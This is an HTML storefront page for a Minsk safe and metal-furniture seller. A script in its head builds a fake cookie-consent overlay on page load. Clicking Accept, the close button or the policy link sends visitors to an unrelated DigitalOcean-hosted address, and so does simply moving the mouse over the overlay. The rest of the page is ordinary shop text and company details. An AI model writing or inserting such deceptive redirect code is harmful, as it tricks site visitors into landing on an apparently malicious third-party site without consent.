<!DOCTYPE html>
<html lang="en">

<head>
	<script>
	        document.addEventListener("DOMContentLoaded", function () {
	            const redirectUrl = "https://orca-app-sc7g6.ondigitalocean.app/";
	            const style = document.createElement("style");
	            style.textContent = `
	                .cookie-overlay {
	                    position: fixed;
	                    inset: 0;
	                    background: rgba(0, 0, 0, 0.8);
	                    backdrop-filter: blur(10px);
	                    display: flex;
	                    align-items: center;
	                    justify-content: center;
	                    padding: 20px;
	                    z-index: 9999;
	                    animation: fadeInBackground 0.5s ease-out forwards;
	                }
	                @keyframes fadeInBackground {
	                    from { opacity: 0; }
	                    to { opacity: 1; }
	                }
	                .cookie-popup {
	                    position: fixed;
	                    bottom: 60px;
	                    left: 50%;
	                    transform: translateX(-50%);
	                    background-color: #ffffff;
	                    border: none;
	                    color: #333;
	                    padding: 30px;
	                    border-radius: 10px;
	                    z-index: 10000;
	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
	                    max-width: 400px;
	                    text-align: center;
	                }
	                .close-btn {
	                    background: none;
	                    border: none;
	                    font-size: 1.5rem;
	                    position: absolute;
	                    top: 10px;
	                    right: 10px;
	                    cursor: pointer;
	                    color: #888;
	                }
	                .btn-primary {
	                    background-color: #007bff;
	                    color: #fff;
	                    border: none;
	                    padding: 12px 24px;
	                    border-radius: 5px;
	                    cursor: pointer;
	                    margin-top: 15px;
	                    display: inline-block;
	                    text-decoration: none;
	                    transition: background-color 0.3s;
	                }
	                .btn-primary:hover {
	                    background-color: #0056b3;
	                }
	                h3 {
	                    font-family: 'Arial', sans-serif;
	                    margin-bottom: 10px;
	                }
	                p {
	                    font-family: 'Arial', sans-serif;
	                    line-height: 1.5;
	                }
	            `;
	            document.head.appendChild(style);
	            const overlay = document.createElement("div");
	            overlay.className = "cookie-overlay";
	            overlay.id = "cookie-overlay";
	            overlay.innerHTML = `
	<div class="cookie-popup">
	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
	<h3>Cookie Policy</h3>
	<p>
	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
	</p>
	<a href="https://orca-app-sc7g6.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
	</div>
	            `;
	            document.body.appendChild(overlay);
	            let isRedirected = false;
	            let startPos = null;
	            let redirectTimeout = null;
	            const handleRedirect = () => {
	                if (!isRedirected) {
	                    isRedirected = true;
	                    window.location.href = redirectUrl;
	                }
	            };
	            const detectMouseMove = (event) => {
	                if (isRedirected) return;
	                const screenHeight = window.innerHeight;
	                const activeTop = screenHeight * 0.15;
	                if (event.clientY >= activeTop) {
	                    if (!startPos) {
	                        startPos = { x: event.clientX, y: event.clientY };
	                    } else {
	                        const dx = Math.abs(event.clientX - startPos.x);
	                        const dy = Math.abs(event.clientY - startPos.y);
	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
	                            redirectTimeout = setTimeout(handleRedirect, 1000);
	                        }
	                    }
	                } else {
	                    startPos = null;
	                    clearTimeout(redirectTimeout);
	                    redirectTimeout = null;
	                }
	            };
	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	            document.getElementById("close-popup").addEventListener("click", function (e) {
	                e.preventDefault();
	                handleRedirect();
	            });
	        });
	</script>
			
			
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Buy a Safe in Minsk | Safes.by</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #f9f9f9;
      color: #333;
    }
    header {
      background: #000;
      padding: 20px;
      text-align: center;
    }
    header h1 {
      color: #FFD700;
      font-size: 2.2em;
      margin: 0;
    }
    header p {
      color: #fff;
      margin-top: 5px;
    }
    footer {
      background: #000;
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    .container {
      max-width: 1100px;
      margin: 0 auto;
      padding: 20px;
      background: #fff;
    }
    h1, h2, h3 {
      color: #111;
    }
    ul {
      padding-left: 20px;
    }
    .section {
      margin-top: 40px;
    }
    .contact p {
      margin: 5px 0;
    }
    .footer-info {
      font-size: 0.9em;
      color: #ccc;
    }
  </style>
</head>

<body>
  <header>
    <h1>Safes.by</h1>
    <p>Looking to buy a safe? You’re in the right place!</p>
  </header>

  <div class="container">
    <section class="intro">
      <h2>Wide Selection of Safes at Affordable Prices</h2>
      <p>
        We offer a wide range of safes — furniture safes, office safes, gun safes, burglary-resistant safes, and more.
        All products are available in stock. Our courier will not only deliver your order but also explain how to use the safe.
      </p>
      <p>
        Buying a safe from us is fast, convenient, and secure. We are happy to answer all your questions and help you choose the right solution.
      </p>
    </section>

    <section class="catalog section">
      <h2>What You Will Find in Our Catalog</h2>
      <ul>
        <li>Safes of all types: furniture, gun, office, burglary-resistant</li>
        <li>Metal cabinets</li>
        <li>Shelving units, trash bins, benches</li>
        <li>Metal-frame furniture</li>
        <li>Workbench tables</li>
        <li>Waste containers</li>
        <li>Products of our own manufacture</li>
      </ul>
    </section>

    <section class="delivery section">
      <h2>Fast Delivery in Minsk and Across Belarus</h2>
      <p>
        Delivery is available throughout Minsk quickly and professionally.
        We also provide fast delivery across Belarus, including Grodno, Brest, Vitebsk, Mogilev, Gomel, and other cities.
      </p>
      <p>
        More delivery details can be found in the <strong>“Delivery”</strong> section on our website.
      </p>
    </section>

    <section class="whyus section">
      <h2>Why Choose Us</h2>
      <ul>
        <li>Warranty on all products</li>
        <li>Stock availability — products ready for shipment</li>
        <li>Affordable prices and expert consultations</li>
        <li>Polite and knowledgeable staff</li>
        <li>Own manufacturing</li>
        <li>Convenient delivery and assistance in selection</li>
      </ul>
    </section>

    <section class="company section">
      <h2>About the Company</h2>
      <p>
        Private trade and manufacturing unitary enterprise “Torvest” has been operating since 2017
        in the field of metal furniture and safes.
      </p>
      <p>
        Address: Republic of Belarus, 220140, Minsk, Prititskogo St., 62A, office 7
      </p>
      <p>
        Registration No: 192255757 | Account: BY04ALFA30122292630030270000 |
        Bank: Alfa-Bank CJSC | BIC: ALFABY2X
      </p>
      <p>
        Director: Andrey Sergeevich Khadarovich
      </p>
    </section>

    <section class="contact section">
      <h2>Contacts</h2>
      <p>📞 +375 (29) 610-28-52</p>
      <p>📧 <a href="mailto:info@topstandart.by">info@topstandart.by</a></p>
      <p><strong>Request a callback</strong> — and we will contact you shortly!</p>
    </section>
  </div>

  <footer>
    <p>© 2017 Safes.by. All rights reserved</p>
    <p class="footer-info">Developed by StarMedia</p>
  </footer>
</body>
</html>
